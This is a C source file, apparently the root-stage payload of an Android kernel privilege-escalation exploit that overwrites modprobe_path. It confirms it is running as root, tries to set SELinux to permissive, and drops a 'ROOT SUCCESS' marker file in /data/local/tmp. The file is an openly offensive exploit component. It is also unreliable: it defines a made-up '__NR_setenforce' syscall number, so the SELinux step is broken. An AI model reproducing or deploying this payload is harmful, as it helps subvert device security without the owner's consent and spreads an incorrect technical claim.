/*
 * x_payload.c - Root payload for modprobe_path overwrite
 * 
 * Build (NDK 21.4, 32-bit ARM, STATIC):
 *   clang x_payload.c -o x_payload -static --target=arm-linux-androideabi
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>

/* 
 * 32-bit ARM syscall numbers for SELinux 
 * (避免依赖可能缺失的 Android NDK 头文件)
 */
#ifndef __NR_setenforce
#define __NR_setenforce 12
#endif

static void write_debug_log(const char *msg) {
    FILE *f = fopen("/data/local/tmp/debug.txt", "a");
    if (f) {
        fprintf(f, "[PID %d | UID %d] %s\n", getpid(), getuid(), msg);
        fclose(f);
    }
}

int main(int argc, char *argv[]) {
    // ★ 黄金法则：第一步永远写 debug.txt
    write_debug_log("Payload executed! Starting root chain...");

    // 检查当前 UID
    if (getuid() != 0) {
        write_debug_log("FATAL: Not running as root! Aborting.");
        return 1;
    }

    // 尝试将 SELinux 切换为 Permissive (0)
    // 如果内核不支持此 syscall 或 SELinux 拦截，这里会失败
    int ret = syscall(__NR_setenforce, 0);
    if (ret == 0) {
        write_debug_log("SELinux set to Permissive successfully.");
    } else {
        char buf[128];
        snprintf(buf, sizeof(buf), "setenforce failed (ret=%d, errno=%d). Trying to write anyway...", ret, errno);
        write_debug_log(buf);
    }

    // 创建 rooted.txt
    FILE *f = fopen("/data/local/tmp/rooted.txt", "w");
    if (f) {
        fprintf(f, "ROOT SUCCESS!\n");
        fprintf(f, "UID: %d\n", getuid());
        fprintf(f, "SELinux setenforce ret: %d\n", ret);
        fclose(f);
        write_debug_log("rooted.txt created successfully!");
    } else {
        char buf[128];
        snprintf(buf, sizeof(buf), "FATAL: Failed to create rooted.txt (errno=%d). SELinux blocked?", errno);
        write_debug_log(buf);
    }

    return 0;
}